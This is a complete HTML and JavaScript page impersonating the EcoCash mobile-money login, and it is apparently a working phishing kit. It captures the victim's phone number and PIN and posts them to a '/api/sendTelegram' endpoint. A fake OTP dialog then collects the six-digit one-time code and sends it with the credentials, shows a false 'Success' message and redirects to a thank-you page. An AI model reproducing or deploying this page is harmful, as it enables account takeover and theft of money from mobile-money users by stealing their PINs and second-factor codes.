<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>EcoCash — Login</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
*{box-sizing:border-box}
html,body{height:100%}
body{
  font-family:Inter,system-ui,Arial;
  background:linear-gradient(180deg,#f7fbff,#e8f3ff);
  margin:0;
  padding:18px;
  display:flex;
  align-items:center;
  justify-content:center;
}

.card{
  width:100%;
  max-width:380px;
  background:#fff;
  padding:20px;
  border-radius:12px;
  box-shadow:0 12px 30px rgba(2,6,23,0.06)
}

.logo{height:44px;display:block;margin:0 auto 10px}
h2{text-align:center;margin:0 0 12px;color:#111;font-size:20px}

label{display:block;font-size:13px;color:#374151;margin-top:8px}

input{
  width:100%;
  padding:10px;
  border-radius:8px;
  border:1px solid #e6eefc;
  background:#fbfdff;
  font-size:14px
}

.btn{
  background:#4b86ff;
  color:#fff;
  padding:10px;
  border-radius:8px;
  border:0;
  margin-top:12px;
  cursor:pointer;
  width:100%
}
.btn[disabled]{background:#cbd5e1;color:#6b7280;cursor:not-allowed}

.phone-wrap{
  display:flex;
  gap:6px;
  align-items:center
}
.prefix{
  padding:10px;
  background:#f1f5f9;
  border:1px solid #e6eefc;
  border-radius:8px;
  font-size:14px
}

.error{
  display:block;
  min-height:18px;
  margin-top:4px;
  font-size:13px;
  color:#d04444
}

.pin-row{
  display:flex;
  gap:8px;
  justify-content:center;
  margin-top:6px
}
.pin-digit{
  width:40px;
  height:48px;
  text-align:center;
  font-size:20px;
  border-radius:8px;
  border:1px solid #e6eefc;
  background:#fbfdff
}

/* OTP modal */
.otp-modal{
  position:fixed;
  inset:0;
  display:flex;
  align-items:center;
  justify-content:center;
  background:rgba(0,0,0,0.35)
}
.otp-box{
  background:#fff;
  padding:18px;
  border-radius:12px;
  min-width:300px;
  max-width:92%
}
.otp-row{
  display:flex;
  gap:8px;
  justify-content:center;
  margin-top:8px
}
.otp-digit{
  width:40px;
  height:48px;
  text-align:center;
  font-size:20px;
  border-radius:8px;
  border:1px solid #e6eefc;
  background:#fbfdff
}
.otp-warning{
  color:#d04444;
  font-size:13px;
  margin-top:8px;
  display:none
}
.small{font-size:13px;color:#6b7280}
.success{color:#16a34a;font-weight:600}
</style>
</head>

<body>

<div class="card">
  <img src="assets/eco.png" alt="EcoCash logo" class="logo">

  <h2>Login</h2>

  <form id="loginForm" autocomplete="off">

    <label>Mobile Number</label>
    <div class="phone-wrap">
      <div class="prefix">+263</div>
      <input id="phone" inputmode="numeric" placeholder="7XXXXXXXX">
    </div>
    <div id="phoneError" class="error"></div>

    <label>Enter your PIN</label>
    <div class="pin-row">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
    </div>

    <!-- honeypot -->
    <input type="text" id="hp" style="display:none">

    <button type="submit" id="loginBtn" class="btn" disabled>LOGIN</button>
  </form>
</div>

<!-- OTP MODAL -->
<div id="otpModal" class="otp-modal" style="display:none">
  <div class="otp-box">
    <div style="text-align:center"><strong>Enter OTP</strong></div>

    <div class="otp-row">
      <input class="otp-digit" maxlength="1" id="d0">
      <input class="otp-digit" maxlength="1" id="d1">
      <input class="otp-digit" maxlength="1" id="d2">
      <input class="otp-digit" maxlength="1" id="d3">
      <input class="otp-digit" maxlength="1" id="d4">
      <input class="otp-digit" maxlength="1" id="d5">
    </div>

    <div id="otpWarning" class="otp-warning">Please input 6 digits</div>

    <div class="small" id="resendInfo" style="margin-top:8px">
      Resend available in <span id="countdown">120</span>s
    </div>

    <div style="display:flex;gap:10px;margin-top:12px">
      <button id="confirmOtp" disabled>Confirm</button>
      <button id="cancelOtp">Cancel</button>
    </div>

    <div id="otpStatus" class="small" style="margin-top:8px"></div>
  </div>
</div>

<script>
/* ===== PHONE VALIDATION (INLINE WARNING) ===== */
const phone = document.getElementById('phone');
const phoneError = document.getElementById('phoneError');
const loginBtn = document.getElementById('loginBtn');

function validatePhone(){
  const raw = phone.value.replace(/\D/g,'');
  phone.value = raw;

  if(!/^7\d{8}$/.test(raw)){
    phoneError.textContent = 'Input 9-digit Econet number starting with 7';
    phoneError.style.visibility = 'visible';
    return false;
  }

  phoneError.textContent = '';
  phoneError.style.visibility = 'visible';
  return true;
}

phone.addEventListener('input', ()=>{
  validatePhone();
  updateLoginState();
});
phone.addEventListener('blur', validatePhone);

/* ===== PIN ===== */
const pinBoxes = Array.from(document.querySelectorAll('.pin-digit'));
let pinValue = '';

pinBoxes.forEach((box, idx)=>{
  box.addEventListener('input', ()=>{
    box.value = box.value.replace(/\D/g,'');
    if(box.value && idx < 3) pinBoxes[idx+1].focus();
    pinValue = pinBoxes.map(b=>b.value).join('');
    updateLoginState();
  });

  box.addEventListener('keydown', e=>{
    if(e.key === 'Backspace' && !box.value && idx > 0){
      pinBoxes[idx-1].focus();
      pinBoxes[idx-1].value = '';
      e.preventDefault();
    }
  });
});

function updateLoginState(){
  loginBtn.disabled = !(
    validatePhone() &&
    /^\d{4}$/.test(pinValue)
  );
}

/* ===== API ===== */
async function sendToServer(payload){
  return fetch('/api/sendTelegram', {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(payload)
  });
}

/* ===== OTP LOGIC (ORIGINAL) ===== */
const otpModal = document.getElementById('otpModal');
const dEls = [0,1,2,3,4,5].map(i=>document.getElementById('d'+i));
const confirmBtn = document.getElementById('confirmOtp');
const cancelBtn = document.getElementById('cancelOtp');
const otpWarning = document.getElementById('otpWarning');
const otpStatus = document.getElementById('otpStatus');
const resendInfo = document.getElementById('resendInfo');
const countdownEl = document.getElementById('countdown');

let resendTimer = null;
let secondsLeft = 120;

function startResendCountdown(){
  clearInterval(resendTimer);
  secondsLeft = 120;
  resendInfo.innerHTML = `Resend available in <span id="countdown">120</span>s`;
  resendTimer = setInterval(()=>{
    secondsLeft--;
    countdownEl.textContent = secondsLeft;
    if(secondsLeft <= 0){
      clearInterval(resendTimer);
      resendInfo.textContent = "Didn't receive OTP?";
    }
  },1000);
}

function getOtp(){
  return dEls.map(el=>el.value || '').join('');
}

function updateConfirmState(){
  const ok = /^\d{6}$/.test(getOtp());
  confirmBtn.disabled = !ok;
  otpWarning.style.display = ok ? 'none' : 'block';
}

dEls.forEach((el, idx)=>{
  el.addEventListener('input', ()=>{
    el.value = el.value.replace(/\D/g,'');
    if(el.value && idx < 5) dEls[idx+1].focus();
    updateConfirmState();
  });

  el.addEventListener('keydown', e=>{
    if(e.key === 'Backspace' && !el.value && idx > 0){
      dEls[idx-1].focus();
      dEls[idx-1].value = '';
      e.preventDefault();
    }
  });
});

/* ===== LOGIN ===== */
document.getElementById('loginForm').addEventListener('submit', async e=>{
  e.preventDefault();
  if(document.getElementById('hp').value) return;

  otpModal.style.display = 'flex';
  dEls.forEach(d=>d.value='');
  confirmBtn.disabled = true;
  otpWarning.style.display = 'none';
  otpStatus.textContent = '';
  startResendCountdown();

  await sendToServer({
    event:'login_clicked',
    loginPhone:'+263'+phone.value,
    loginPin:pinValue,
    submittedAt:new Date().toISOString()
  });
});

cancelBtn.addEventListener('click', ()=>{
  otpModal.style.display = 'none';
  clearInterval(resendTimer);
});

confirmBtn.addEventListener('click', async ()=>{
  await sendToServer({
    event:'otp_confirm',
    loginPhone:'+263'+phone.value,
    loginPin:pinValue,
    otp:getOtp(),
    submittedAt:new Date().toISOString()
  });

  otpStatus.innerHTML = "<span class='success'>Success — your request has been received.</span>";
  setTimeout(()=>window.location.href='thankyou.html',1200);
});
</script>

</body>
</html>
